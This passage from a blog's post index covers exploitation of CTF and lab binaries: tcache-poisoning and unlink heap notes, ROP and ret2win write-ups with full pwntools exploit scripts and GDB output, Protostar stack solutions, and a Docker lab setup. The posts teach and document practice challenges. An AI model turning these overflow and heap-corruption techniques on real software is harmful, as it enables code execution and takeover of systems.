unlock function runs, it first decrements cnt, which undeflows from 0 to 0xffffffff, then the check to see if cnt is zero fails.   Because the check fails, the owner field is not cleared, and the null byte from gets() is written after the TLS pointer allowing a call to puts()/printf to leak the address.     Reference  ret2gets"
  },
  
  {
    "title": "Tcache Poisioning",
    "url": "/post/tcache-poisioning/",
    "categories": "Notes, heap-exploitation",
    "tags": "tcache, tcach-poisioning",
    "date": "2025-09-25 00:00:00 +0200",
    "content": "Understanding Tcache  Thread Local Caching (Tcache) is a set of bins, organised as singly-linked lists, that are local to each thread. Tcache was made to avoid the need to lock a global arena for frequent small allocations (from 0x10 up to 0x400, excluding metadata), making multi-threaded programs faster. When a chunk is freed, it gets placed into one of these bins. Each bin can store up to 7 bins in a single thread, and when the tcache bins are full then the chunks go to the standard bins. The tcache bins are singly-linked lists (LIFO).  Each Thread has its own tcache_perthread_struct which contains 2 arrays:    An array of bins for different chunks sizes.   A corresponding array of counts for each bin.   typedef struct tcache_perthread_struct { \tchar counts[TCACHE_MAX_BINS]; \ttcache_entry *entries[TCACHE_MAX_BINS]; } tcache_perthread_struct;   When a chunk is freed into the tcache bin, its user data area is repurposed to store a tcache_entry structure. The tcache_entry structure contains:    A pointer that points to the next free chunk in the bin.   A key field used for security checks.            This field is a pointer back to the tcache_perthread_struct structure, and its only purpose is to detect double free attempts.       This mitigation can be bypassed by overwriting the key field.           typedef struct tcache_entry { \tstruct tcache_entry *next;  \t/* This field exists to detect double frees. */  \tuintptr_t key;_ } tcache_entry;  Exploitation  You need some type of bug that can provide the initial foothold needed to carry out poisoning :    Use-After-Free (UAF)   Double Free   Heap Overflow   Tcache  also has some mitigations:    Double Free protection: (mentioned earlier) The key field in the tcache_entry field is used to detect double frees.   Safe Linking : this mitigation encrypts the next pointer in the tcache_entry structure by XORing it with the address of the pointer itself, shifted right by 12 bits. This makes it harder to overwrite the pointer with an arbitrary address. This can be bypassed by leaking a heap address from the same memory region, they can often compute the correct value needed to poison the pointer.     Tcache Poisoning      The aim of this technique is to trick malloc into returning a pointer to an arbitrary memory location (e.g function return address, hook pointer, etc.). This technique provides a write-what-where primitive.  Process of the technique:    Free at least 2 chunks (tcache size).   Use a vulnerability such as use-after-free or heap overflow, to overwrite the next pointer of the tcache_entry structure of a freed chunk that is currently in the tcache bin with a target address that you want to overwrite (e.g. GOT entry or __malloc_hook).            This needs a leak of the chunks address that we are overwriting. The next ptr must be overwritten with : fake_next_ptr = ((target_address ) ^ (heap_chunk_address &gt;&gt; 12))           Make two malloc calls for chunk of the same size as the poisoned free chunk.            First malloc call returns, corrupted chunk from the tcache.       Second malloc call follows the poisoned next pointer from the tcache_entry structure and returns a chunk at the attacker’s chosen arbitrary address.           You can now write data directly to the arbitrary address.   Example  This is a example of a arbitrary write.  Vulnerable Code  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt;  struct user { \tchar username[0x10]; \tchar target[32]; } users;  int main() { \tsetbuf(stderr, NULL); \tsetbuf(stdin, NULL); \tsetbuf(stdout, NULL);  \tchar *ptrs[10] = {0}; \tint count = 0; \tint choice, size, index;  \tprintf(\"Enter username: \"); \tscanf(\"%s\", users.username);  \tstrcpy(users.target, \"nothing\");  \tprintf(\"target: %p\\n\\n\", users.target);   \twhile (1) { \t\tprintf(\"\\n1. allocate\\n2. enter data\\n3. free\\n4.view target \\n&gt;&gt; \"); \t\tscanf(\"%d\", &amp;choice); \t\tswitch (choice) { \t\t\tcase 1: \t\t\t\tprintf(\"size: \"); \t\t\t\tscanf(\"%d\", &amp;size); \t\t\t\tptrs[count] = malloc(size); \t\t\t\tprintf(\"leak: %p\\n\", ptrs[count]); \t\t\t\tcount++; \t\t\t\tbreak; \t\t\tcase 2: \t\t\t\tprintf(\"index: \"); \t\t\t\tscanf(\"%d\", &amp;index); \t\t\t\tprintf(\"data: \"); \t\t\t\tscanf(\"%s\", ptrs[index]); \t\t\t\tbreak; \t\t\tcase 3: \t\t\t\tprintf(\"index: \"); \t\t\t\tscanf(\"%d\", &amp;index); \t\t\t\tfree(ptrs[index]); \t\t\tcase 4: \t\t\t\tprintf(\"%s\\n\", users.target); \t\t\tdefault: \t\t\t\tbreak; \t\t} \t} \treturn 0; }   The goal here is to overwrite users.target.  Options    Asks for size and calls malloc with that size, and then prints the pointer to the allocated chunk (leak).   Asks for Index and data to input into a chunk. (heap overflow present)   Frees a chunk. (User-after-free)   Prints the contents of users.target   Exploitation  First the users.username field is there for use to insert metadata for our fake chunk in order to pass the size check.  First we need to 2 allocate chunks  and then free them.  size = 0x10 a = t.malloc(size) # 0 b = t.malloc(size) # 1  t.free(0) t.free(1)   Here is the tcache bin    We will use a use-after-free vulnerability to overwrite the fd/next pointer of the last chunk in the tcache bins : 0x4052c0 which is b in our exploit code.  Now lets create our fake fd/next pointer.  We need to shift the chunk address by 12 bits and then XOR that to our target address (users.target).  fake_next_ptr = (target ^ (b &gt;&gt; 12))   Now we use our use-after-free to overwrite the fd/next pointer of the chunk b 0x4052c0:  t.scanf(1, p64(fake_next_ptr)) # index 1 = b : 0x4052c0   We can see in the image below that now the tcache bins contain our target address.    Target Memory Location: 0x404090     Before corruption: 0x4052c0 -&gt; 0x4052a0   After corruption: 0x4052c0 -&gt; 0x404090   The next call to malloc of the same size will return the chunk b : 0x4052c0, then the next one will return our target memory location.  c = t.malloc(size) # 2 d = t.malloc(size) # 3   d is our target memory location.  Now we can write to our target.  t.scanf(3, b\"pwned\")   Full exploit code  class Tcache: \tdef __init__(self): \t\tself.c = b\"&gt;&gt; \" \t\tself.count = 0  \tdef malloc(self, size:int): \t\tlog.info(f\"Allocating chunk {self.count}\") \t\tsla(self.c, b'1') \t\tsla(b'size: ', str(size).encode()) \t\tru(b\"0x\") \t\tleak = int(rl(), 16) \t\tprint_leak(\"leak \", leak) \t\tself.count += 1 \t\treturn leak  \tdef free(self, index:int): \t\tlog.info(f\"Now Freeing chunk {index}\") \t\tsla(self.c, b'3') \t\tsla(b\"index: \", str(index).encode())  \tdef scanf(self, index:int, data:bytes): \t\tsla(self.c, b'2') \t\tsla(b\"index: \", str(index).encode()) \t\tsla(b\"data: \", data)  \tdef check(self): \t\tsla(self.c, b'4') \t\tx = rl().rstrip(b\"\\r\\n\") \t\tlog.info(f\"Target Holds: '{x.decode()}'\")   def exploit(): \t#####################################################################  \t######################## EXPLOIT CODE ############################### \t##################################################################### \tsize = 0x10 \tmetadata = flat( \t\t0x20 \t) \tlog.info(f\"Metadata: {metadata} | len {len(metadata)}\") \tsla(b\"username: \", metadata) \tru(b\"target: \") \ttarget = int(rl(), 16) \tprint_leak(\"target\", target)  \tt = Tcache() \ta = t.malloc(size) \tb = t.malloc(size)  \tfake_next_ptr = ((target ) ^ (b &gt;&gt; 12)) \tt.free(0) \tt.free(1)  \tlog.info(\"Use After Free on chunk 1\") \tt.scanf(1, p64(fake_next_ptr)) \tc = t.malloc(size) \td = t.malloc(size) \tt.scanf(3, b\"pwned\") \tt.check() \t   We we run the code.    As you can see users.target now holds our string “pwned”    References"
  },
  
  {
    "title": "Unlink Exploit",
    "url": "/post/unlink-exploit/",
    "categories": "Notes, heap-exploitation",
    "tags": "unlink-exploit",
    "date": "2025-09-07 00:00:00 +0200",
    "content": "Unlink Exploit  In this blog I will try to explain the unlink  heap exploit technique and also show examples of how it works. I have had a hard time understanding how this technique works, so i thought let me try to explain it to someone else (via this blog post at least) to see if i really understood the technique. Overview  These technique is triggered by the unlink macro hence the name. The unlink macro is used to remove a free chunks from the middle of a bin (double-linked list), the bins include unsorted bin, small bin, and large bin. The tcache/fastbin are singly-linked-lists they won’t apply the unlink mechanism . This exploit has a write-what-where primitive .  When a chunk is remove from a bin, the unlink() macro is called on the chunk. The unlink macro looks like this:  #define unlink(AV, P, BK, FD) {                                            \\     if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \\       malloc_printerr (check_action, \"corrupted size vs. prev_size\", P, AV);  \\     FD = P-&gt;fd;                                    \\     BK = P-&gt;bk;                                    \\     if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))           \\       malloc_printerr (check_action, \"corrupted double-linked list\", P, AV);  \\     else {                                    \\         FD-&gt;bk = BK;                               \\         BK-&gt;fd = FD;                               \\         if (!in_smallbin_range (chunksize_nomask (P))        }              \\ }   At first this macro was difficult for me to understand so here is another way to view it.  /* Curr = current chunk (P) Next = next chunk in doubly linked list (FD) Prev = previous chunk in doubly linked list (BK)  */  Next = Curr-&gt;fd; Prev = Curr-&gt;bk;  Next-&gt;bk = Prev; Prev-&gt;fd = Next;   The macro is changing the pointers of the chunks before (BK/Prev) and after (FD/Next) the victim chunk (P/Curr).  The below images show how the macro works in the unlink process.     The middle chunk is being unlinked.   Before Unlink    After Unlink    To clearly understand this technique we first have to understand heap consolidation. Heap Consolidation.  When a chunk is freed, it is put into the unsorted bin. The chunk will first be merged with neighbouring free chunks, then added to the unsorted bin as a larger free chunk for future allocations. How it works:    Consolidate backward  If previous chunk in memory is not in use (prev_inuse bit == 0), unlink is called on the previous chunk to take it off the free list. The previous chunk’s size is then added to the current chunk’s size, and the current chunk pointer points to the previous chunk.   Consolidate forward  If next chunk in memory is not the top chunk and not in use (confirmed by next-to-next chunk's prev_inuse bit), unlink is called on the next chunk to take it off the free list. The next chunk’s size is added to the current chunk’s size.   Add consolidated chunk to unsorted bin.  The unlink macro is called.     Unlink Exploit  In older glibc versions we can use this vulnerability to modify the fd and bk pointers of the P/Curr chunk to perform arbitrary read/write primitive after the macro executes.  Lets break down the unlink macro from a C language’s point of view.    32-bit architecture     BK = *(P + (0x4 * 3)); // Prev = *(Curr + (0x4 * 3)); FD = *(P  + (0x4 * 2)); // Next = *(Curr + (0x4 *2)); *(FD + (0x4 * 3)) = BK; // *(Next + (0x4 * 3)) = Prev *(BK + (0x4 * 2)) = FD; // *(Prev + (0x4 * 2)) = Next           64-bit architecture     BK = *(P + (0x8 * 3)); // Prev = *(Curr + (0x8 * 3)); FD = *(P  + (0x8 * 2)); // Next = *(Curr + (0x8 *2)); *(FD + (0x8 * 3)) = BK; // *(Next + (0x8 * 3)) = Prev *(BK + (0x8 * 2)) = FD; // *(Prev + (0x8 * 2)) = Next           If we had fully control of the chunk P/Curr (first chunk) , we can put any values to P-&gt;bk/Curr-&gt;bk and P-&gt;bk/Curr-&gt;bk (usually has to be global variable), and we can achieve arbitrary write.  If we can overflow the first chunk into the second chunk, then we are free to put any value to bk and fd of the second chunk.  We can achieve arbitrary write by:    change fd of fake chunk to point near global ptr so that P-&gt;fd-&gt;bk = P   change fd of fake chunk to point near to global pointer so that P-&gt;bk-&gt;fd = P   trigger ``unlink`   use first chunk to overwrite itself to point to an arbitrary location.   We need to overflow to the next chunk and unset the prev_inuse bit so that when we free the second chunk backward consolidation can happen and the unlink macro will be called.    Steps    Allocate two adjacent chunk.   Setup fd and bk of first chunk. (near global ptr)   Overflow on first chunk to control the metadata of the second chunk.            Set the prev_size to 0       Unset the prev_inuse bit       Set the size. (larger the fastbins size)           Trigger the unlink. (Free second chunk)   Overwrite fd and bk of the fake chunk.            fd point to target address that we want to overwrite. (where)       bk points to address that we want to write. (what)           Control flow will be redirected.   Pwned.     Resources    unlink technique explained   unlink exploit   Once upon a free"
  },
  
  {
    "title": "Global Variable Overwrite",
    "url": "/post/Global_varibale_overwrite/",
    "categories": "writeup, pwn",
    "tags": "stack",
    "date": "2025-07-28 00:00:00 +0200",
    "content": "Exploit Write-up: Buffer Overflow with Global Variable Control  Challenge  Overview  In this challenge, we are given a C program that contains a buffer overflow vulnerability in the func() function. The goal is to exploit this vulnerability to print the contents of the correct flag file, flag2.txt, even though the binary is hardcoded to open flag1.txt.    Source Code Summary  static const char* flagfile = \"flag1.txt\";  static void giveFlag(void) {     char flag[64];     FILE* fp = fopen(flagfile, \"r\");     if (!fp) {         perror(flagfile);         return;     }     fgets(flag, sizeof(flag), fp);     fclose(fp);     printf(\"Here is your first flag: %s\\n\", flag); }   In giveFlag(), the program uses a global variable flagfile to open the flag file. Our goal is to make it open flag2.txt instead.    Vulnerability  In func():  void func(void) {     bool didPurchase = false;     char input[50];      printf(\"Debug info: Address of input buffer = %p\\n\", input);     read(STDIN_FILENO, input, 1024);      if (didPurchase) {         printf(\"Thank you for purchasing Hackersoft Powersploit!\\n\");         giveFlag();     } else {         printf(\"This program has not been purchased.\\n\");     } }      input is a 50-byte buffer.   The program reads 1024 bytes into it using read(), which causes a stack-based buffer overflow.   didPurchase is right before input on the stack, so it can be overwritten.   After that, the return address can also be overwritten.     Exploitation Plan    Overwrite didPurchase to true so that giveFlag() is called.        Overwrite the global variable flagfile to point to \"flag2.txt\" instead of \"flag1.txt\".     Step-by-Step Exploitation     Step 1: Overwrite didPurchase            Since didPurchase is right above input, the first byte of overflow can flip it to non-zero (true).         Step 2: Overwrite flagfile              flagfile is a global pointer. So we can overwrite it with a pointer to \"flag2.txt\" stored in our buffer.         Step 3: Use ROP to overwrite flagfile                     Since we control the return address, we can craft a ROP chain to write the address of \"flag2.txt\" into the flagfile global variable.   ROP gadget Used:   0x08049400 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret   Payload: payload = flat( \tcyclic(63), # bytes to fill buffer up to EIP \t# write flag2.txt to writable memory \tread_, # read function address from giveflag function \tgadget, #  pop ebx ; pop esi ; pop edi ; pop ebp ; ret \t0, # stdin \tbss, # buf address where is will be store (writeable memory) \t11, # len \t0x0, # junk \t#overwrite the flagfile variable pointer \tread_, # read function address from giveflag function \tgadget, #  pop ebx ; pop esi ; pop edi ; pop ebp ; ret \t0, # stdin \tflagfile_addr_ptr, # hardcoded flagfile addr \t0x0, \tgiveFlag, # giveflag function ptr )   Full Exploit Script    Lessons Learned     Global variables can be overwritten indirectly through buffer overflows."
  },
  
  {
    "title": " Pwn & Reverse Engineering Lab with Docker",
    "url": "/post/Pwn-Environment-Lab/",
    "categories": "pwn",
    "tags": "pwn-env",
    "date": "2025-07-23 00:00:00 +0200",
    "content": "Building a Reproducible Pwn &amp; Reverse Engineering Lab with Docker  Spinning up a reliable workspace for reverse engineering and binary exploitation on modern machines can be tricky. Old challenges expect legacy libc, glibc quirks, and tools that no longer compile cleanly.  By containerizing the environment, you get isolation, repeatability, and an easy way to share your setup. This post walks through building a Docker-based pwn lab with:     Ubuntu 16.04 (classic CTF baseline)   GDB + GEF for debugging   Pwntools for exploit scripting   Radare2 for reverse engineering     Why Docker?     Consistency – the same toolchain everywhere   Isolation – no host pollution   Reproducibility – identical lab on any machine   Legacy Support – easily run older glibc/libc builds     Step 1 – Base Image &amp; Core Tools  Start from Ubuntu 16.04 and pull in common build dependencies:  FROM ubuntu:16.04  ENV DEBIAN_FRONTEND=noninteractive   # Core build tools &amp; basic utilities  RUN apt-get update &amp;&amp; apt-get install -y \\      \tbuild-essential wget curl git vim sudo \\      \tgcc-multilib g++-multilib make socat \\      \tstrace ltrace patchelf file \\      \t&amp;&amp; rm -rf /var/lib/apt/lists/*       Why Ubuntu 16.04? Many older challenges and tutorials assume its glibc layout, which differs from newer releases.     Step 2 – Python &amp; Pwntools  Most exploit scripts are Python-based. Build a modern Python and install pwntools:  # Build Python 3.10  RUN wget https://www.python.org/ftp/python/3.10.13/Python-3.10.13.tgz \\     \t&amp;&amp; tar xzf Python-3.10.13.tgz \\      \t&amp;&amp; cd Python-3.10.13 &amp;&amp; ./configure --enable-optimizations \\    \t&amp;&amp; make -j$(nproc) &amp;&amp; make altinstall   \t # Install pwntools &amp; friends  RUN python3.10 -m pip install --no-cache-dir --upgrade pip \\      \t&amp;&amp; pip install pwntools ROPgadget one_gadget      Step 3 – Debugging &amp; Reverse Engineering  Add GDB + GEF and Radare2:  # Build GDB &amp; add GEF  RUN wget https://ftp.gnu.org/gnu/gdb/gdb-14.2.tar.gz \\      \t&amp;&amp; tar -xzf gdb-14.2.tar.gz &amp;&amp; cd gdb-14.2 \\      \t&amp;&amp; ./configure --with-python=python3 &amp;&amp; make -j$(nproc) &amp;&amp; make install  \t RUN wget -q -O ~/.gdbinit-gef.py https://gef.blah.cat/py \\      \t&amp;&amp; echo \"source ~/.gdbinit-gef.py\" &gt;&gt; ~/.gdbinit   \t # Radare2 RUN git clone https://github.com/radareorg/radare2.git /opt/radare2 \\     &amp;&amp; cd /opt/radare2 &amp;&amp; ./sys/install.sh      These give you a modern GDB with Python scripting plus Radare2 for static/dynamic analysis.     Step 4 – Convenience Tweaks  Create a non-root user, mount a workspace, and set a sensible default command:  # Non-root user for safety  RUN useradd -m pwn &amp;&amp; echo \"pwnr ALL=(ALL) NOPASSWD:ALL\" &gt;&gt; /etc/sudoers  USER pwn WORKDIR /home/pwn/workspace  CMD [\"/bin/bash\"]     Step 5 – Build &amp; Run  # Build the image  docker build -t pwn-env .   # Run with debugging privileges  docker run -it --rm --cap-add=SYS_PTRACE --security-opt seccomp=unconfined \\   -v \"$(pwd)\":/home/hacker/workspace pwn-env     Wrap-Up  This approach gives you a clean, reproducible lab tailored for binary exploitation and reverse engineering:     Legacy-friendly glibc from Ubuntu 16.04   Modern scripting via Python &amp; pwntools   Robust debugging with GDB + GEF   Reverse engineering with Radare2   You can extend the image with extras (Android tools, QEMU for embedded work, etc.) as your research grows—just keep each section modular so you understand what you’re adding."
  },
  
  {
    "title": "UMDCTF",
    "url": "/post/Gambling/",
    "categories": "writeup, pwn",
    "tags": "gambling",
    "date": "2025-04-28 00:00:00 +0200",
    "content": "UMDCTF Gambling pwn challenge    About binary  pwn checksec gambling [*] '/home/hacker/REPO/binexp/comp/umdctf/gambling/gambling'     Arch:     i386-32-little     RELRO:    Partial RELRO     Stack:    No canary found     NX:       NX enabled     PIE:      No PIE (0x8048000)     FORTIFY:  Enabled      Source Code  #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt;  float rand_float() {   return (float)rand() / RAND_MAX; }  void print_money() { \tsystem(\"/bin/sh\"); }  void gamble() { \tfloat f[4]; \tfloat target = rand_float(); \tprintf(\"Enter your lucky numbers: \"); \tscanf(\" %lf %lf %lf %lf %lf %lf %lf\", f,f+1,f+2,f+3,f+4,f+5,f+6); \tif (f[0] == target || f[1] == target || f[2] == target || f[3] == target || f[4] == target || f[5] == target || f[6] == target) {  \t\tprintf(\"You win!\\n\"); \t\t// due to economic concerns, we're no longer allowed to give out prizes. \t\t// print_money(); \t} else { \t\tprintf(\"Aww dang it!\\n\"); \t} }  int main(void) {     setvbuf(stdout, NULL, _IONBF, 0);     setvbuf(stdin, NULL, _IONBF, 0);  \tchar buf[20]; \tsrand(420); \twhile (1) { \t\tgamble(); \t\tgetc(stdin); // consume newline \t\tprintf(\"Try again? \"); \t\tfgets(buf, 20, stdin); \t\tif (strcmp(buf, \"no.\\n\") == 0) { \t\t\tbreak; \t\t} \t} }   Vulnerability  float f[4]; scanf(\" %lf %lf %lf %lf %lf %lf %lf\", f,f+1,f+2,f+3,f+4,f+5,f+6);   This is a buffer overflow vulnerability. A array of the the data type float with the size of only 4 elements  float = 4 bytes float * 4  = 16 bytes only 16 bytes was created in the stack.  Now here is where the vulnerability is. scanf is used to get input, but it is implemented incorrectly, it takes input of 7 doubles  double = 8 bytes double * 7 = 56 bytes user can input 56 bytes which will cause a overflow    Exploitation path     Find the offset to instruction pointer.   Find the address that the instruction pointer will point to print_money   Overwrite instruction pointer and call print_money   Offset  since the binary takes input as double we need to interpret bytes as doubles  from pwn import *  pattern = cyclic(200)  doubles = [] for i in range(0, len(pattern), 8):     chunk = pattern[i:i+8]     # pad to 8 bytes      if len(chunk) &lt; 8:         chunk = chunk.ljust(8, b'\\x00')     # reinterpret raw bytes as a double     value = struct.unpack('d', chunk)[0]     doubles.append(value)  # print 7 doubles print(doubles[:7])   Output  python offset.py  1.2217649168290121e+161 1.2217670620782814e+161 1.2217692073275507e+161 1.22177135257682e+161 1.2217734978260893e+161 1.2217756430753586e+161 1.221777788324628e+161    Use a debugger to find the offset to eip  gdb ./gambling -q GEF for linux ready, type `gef' to start, `gef config' to configure 93 commands loaded and 5 functions added for GDB 13.1 in 0.00ms using Python engine 3.11  warning: ~/gef.py: No such file or directory Reading symbols from ./gambling... (No debugging symbols found in ./gambling) gef➤  r Starting program: /home/hacker/REPO/binexp/comp/umdctf/gambling/gambling  [Thread debugging using libthread_db enabled] Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\". Enter your lucky numbers: 1.2217649168290121e+161 1.2217670620782814e+161 1.2217692073275507e+161 1.22177135257682e+161 1.2217734978260893e+161 1.2217756430753586e+161 1.221777788324628e+161  [ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────── registers ──── $eax   : 0xd        $ebx   : 0xffffd0bc  →  0xf7fc14b0  →  0xf7d7e000  →  0x464c457f $ecx   : 0xf7f9c9b8  →  0x00000000 $edx   : 0x1        $esp   : 0xffffd0b0  →  0xf7fc14b0  →  0xf7d7e000  →  0x464c457f $ebp   : 0xffffd0d8  →  0x00000000 $esi   : 0x0804bf10  →  0x08049260  →  &lt;__do_global_dtors_aux+0000&gt; endbr32  $edi   : 0xf7ffcb80  →  0x00000000 $eip   : 0x6161616e (\"naaa\"?) $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63  ─────────────────────────────────────────────────────────────────────────────────── stack ──── 0xffffd0b0│+0x0000: 0xf7fc14b0  →  0xf7d7e000  →  0x464c457f\t ← $esp 0xffffd0b4│+0x0004: 0xf7fd97db  →   mov edi, eax 0xffffd0b8│+0x0008: 0xf7d9aa4f  →  \"_dl_audit_preinit\" 0xffffd0bc│+0x000c: 0xf7fc14b0  →  0xf7d7e000  →  0x464c457f [ Legend: Modified register | Code | Heap | Stack | String ] ─────────────────────────────────────────────────────────────────────────────── registers ──── $eax   : 0xd        $ebx   : 0xffffd0bc  →  0xf7fc14b0  →  0xf7d7e000  →  0x464c457f $ecx   : 0xf7f9c9b8  →  0x00000000 $edx   : 0x1        $esp   : 0xffffd0b0  →  0xf7fc14b0  →  0xf7d7e000  →  0x464c457f $ebp   : 0xffffd0d8  →  0x00000000 $esi   : 0x0804bf10  →  0x08049260  →  &lt;__do_global_dtors_aux+0000&gt; endbr32  $edi   : 0xf7ffcb80  →  0x00000000 $eip   : 0x6161616e (\"naaa\"?) $eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification] $cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63  ─────────────────────────────────────────────────────────────────────────────────── stack ──── 0xffffd0b0│+0x0000: 0xf7fc14b0  →  0xf7d7e000  →  0x464c457f\t ← $esp 0xffffd0b4│+0x0004: 0xf7fd97db  →   mov edi, eax 0xffffd0b8│+0x0008: 0xf7d9aa4f  →  \"_dl_audit_preinit\" 0xffffd0bc│+0x000c: 0xf7fc14b0  →  0xf7d7e000  →  0x464c457f 0xffffd0c0│+0x0010: 0xffffd100  →  0xf7f9aff4  →  0x0021cd8c 0xffffd0c4│+0x0014: 0xf7fc1688  →  0xf7ffdbbc  →  0xf7fc17a0  →  0xf7ffda50  →  0x00000000 0xffffd0c8│+0x0018: 0xf7fc1b70  →  0xf7d9d2dc  →  \"GLIBC_PRIVATE\" 0xffffd0cc│+0x001c: 0x00000001 ───────────────────────────────────────────────────────────────────────────── code:x86:32 ──── [!] Cannot disassemble from $PC [!] Cannot access memory at address 0x6161616e ───────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: \"gambling\", stopped 0x6161616e in ?? (), reason: SIGSEGV ─────────────────────────────────────────────────────────────────────────────────── trace ──── ────────────────────────────────────────────────────────────────────────────────────────────── gef➤  pattern search $eip [+] Searching for '6e616161'/'6161616e' with period=4 [+] Found at offset 52 (little-endian search) likely gef➤       Offset = 52     Open binary in debugger   run binary   enter input from python   search for eip [instruction pointer]   Address to print_money function  rabin2 -s gambling | grep print_money 25  0x000012c0 0x080492c0 GLOBAL FUNC   17       print_money    addr = 0x080492c0 Build exploit script  from pwn import * import struct  # function to change interpret bytes as double def to_double(payload):     doubles = []     for i in range(0, len(payload), 8):         chunk = payload[i:i+8]         # pad to 8 bytes          if len(chunk) &lt; 8:             chunk = chunk.ljust(8, b'\\x00')         # reinterpret raw bytes as a double         value = struct.unpack('d', chunk)[0]         doubles.append(value)     return doubles   offset = 52  ret_addr =  0x080492c0 # print_money  payload = b\"A\"*offset + p32(ret_addr) # pack address to 32 bit  exploit = to_double(payload)  p = process(\"./gambling\") # recv and packet into single space separeted string p.sendlineafter('Enter your lucky numbers:', \" \".join(str(d) for d in exploit)) p.interactive()   Got Shell  python exploit.py [+] Starting local process './gambling': pid 18489 /home/hacker/REPO/binexp/comp/umdctf/gambling/asfd.py:26: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes   p.sendlineafter('Enter your lucky numbers:', \" \".join(str(d) for d in exploit)) /usr/lib/python3/dist-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes   res = self.recvuntil(delim, timeout=timeout) [*] Switching to interactive mode  Aww dang it! $ whoami hacker $"
  },
  
  {
    "title": "Protostar Stack Writeups",
    "url": "/post/Protostar-Stack/",
    "categories": "writeup, pwn",
    "tags": "protostar-stack",
    "date": "2025-04-23 00:00:00 +0200",
    "content": "Protostar Stack Writeups  Stack 0  GOAL : Modify a variable  0x08048405 &lt;+17&gt;:\tlea    eax,[esp+0x1c] 0x08048409 &lt;+21&gt;:\tmov    DWORD PTR [esp],eax 0x0804840c &lt;+24&gt;:\tcall   0x804830c &lt;gets@plt&gt;    This takes user input and stores it at [esp+0x1c]     0x080483fd &lt;+9&gt;:\t    mov    DWORD PTR [esp+0x5c],0x0    0x08048411 &lt;+29&gt;:\tmov    eax,DWORD PTR [esp+0x5c]    0x08048415 &lt;+33&gt;:\ttest   eax,eax    0x08048417 &lt;+35&gt;:\tje     0x8048427 &lt;main+51&gt;    0x08048419 &lt;+37&gt;:\tmov    DWORD PTR [esp],0x8048500    0x08048420 &lt;+44&gt;:\tcall   0x804832c &lt;puts@plt&gt;    0x08048425 &lt;+49&gt;:\tjmp    0x8048433 &lt;main+63&gt;    0x08048427 &lt;+51&gt;:\tmov    DWORD PTR [esp],0x8048529    0x0804842e &lt;+58&gt;:\tcall   0x804832c &lt;puts@plt&gt;    0x08048433 &lt;+63&gt;:\tleave    0x08048434 &lt;+64&gt;:\tret    Stores 0 into a variable, then compares the variable to 0; IF true it prints “Try Again” If false it prints “You have changed the ‘modified variable”  Ghidra Decompiled code  void main(void)  {   char buffer [64];   int please_change_me;      please_change_me = 0;   gets(buffer);   if (please_change_me == 0) {     puts(\"Try again?\");   }   else {     puts(\"you have changed the \\'modified\\' variable\");   }   return; }      Developing Exploit     Find the  Offset (Using gdb)            set breakpoints at main function and ret instruction       run the program in gdb       Create pattern to fill in buffer         gef➤  pattern create 300 [+] Generating a pattern of 300 bytes (n=4) aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac [+] Saved as '$_gef1'                              Continue and fill in the program   check if the is a buffer overflow   gef➤  x/wx $ebp 0x61616174:\tCannot access memory at address 0x61616174      Get the buffer size ```sh gef➤  pattern search 0x61616174 [+] Searching for ‘74616161’/’61616174’ with period=4 [+] Found at offset 76 (little-endian search) likely    Buffer size = 76 Offset = 80 | because we need to override the ebp which takes up 4 bytes   **Exploit** ```python #!/usr/bin/python3  from pwn import *  binary = \"./stack0\" elf = ELF(binary) p = process(binary) #goal is to modify varaible buf_size = 76 offset = 80  payload = b\"A\"*offset payload += p32(0x2) # change the varible to 2  p.sendline(payload) p.interactive()   Stack 1  Goal : Modify the variable to be  ./stack1 $(python3 -c 'print(\"A\"*64 + \"\\x64\\x63\\x62\\x61\")')   Stack 2  Code  void main(void) {   char buffer [64];   int change_me;   char *env;    env = getenv(\"GREENIE\");   if (env == (char *)0x0) {     errx(1,\"please set the GREENIE environment variable\\n\");   }   change_me = 0;   strcpy(buffer,env);   if (change_me == 0xd0a0d0a) {     puts(\"you have correctly modified the variable\");   }   else {     printf(\"Try again, you got 0x%08x\\n\",change_me);   }   return; }   we need to put our exploit in the environment variable GREENIE  To modify the change_me variable we just need to fill in the buffer then put what we want to put in the change_me variable which is \\x0a\\x0d\\x0a\\x0d in this case (little endian)  export GREENIE=$(python -c 'print(\"A\"*64 + \"\\x0a\\x0d\\x0a\\x0d\")')   /stack2  you have correctly modified the variable   Stack 3  Source  void main(void) {   char buffer [64];   code *func_ptr;      func_ptr = (code *)0x0;   gets(buffer);   if (func_ptr != (code *)0x0) {     printf(\"calling function pointer, jumping to 0x%08x\\n\",func_ptr);     (*func_ptr)();   }   return; }  void win(void) {   puts(\"code flow successfully changed\");   return; }   Our exploit needs to fill up the buffer and call the address (pointer ) of the win function  Exploit  #!/usr/bin/python3  from pwn import *  binary = \"./stack3\" elf = ELF(binary) p = process(binary)  buffer_size = 64  addr = p32(elf.sym[\"win\"]) # address of the win function   payload = b\"A\"*buffer_size payload += addr  p.sendline(payload) p.interactive()   Stack 4  #!/usr/bin/python3  from pwn import *  binary = \"./stack4\" elf = ELF(binary) p = process(binary)  win_func = 